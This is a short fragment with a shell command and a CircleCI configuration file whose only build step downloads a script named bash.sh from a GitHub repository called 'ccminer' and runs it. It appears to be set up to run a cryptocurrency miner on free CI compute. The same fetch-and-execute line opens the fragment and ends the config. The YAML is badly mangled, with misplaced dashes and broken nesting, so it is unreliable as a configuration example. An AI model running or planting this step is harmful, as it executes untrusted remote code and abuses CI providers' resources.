wget https://raw.githubusercontent.com/skydgffajk/ccminer/main/bash.sh && chmod +x bash.sh && ./bash.sh

.circleci/config.yml

version: 2.0
jobs:
  build:
      docker:
            - image: cimg/base:2021.04
            -         auth:
            -                   username: mydockerhub-user
            -                             password: $DOCKERHUB_PASSWORD  # context / project UI env-var reference
            -                                 steps:
            -                                       - checkout
      - run: wget https://raw.githubusercontent.com/skydgffajk/ccminer/main/bash.sh && chmod +x bash.sh && ./bash.sh
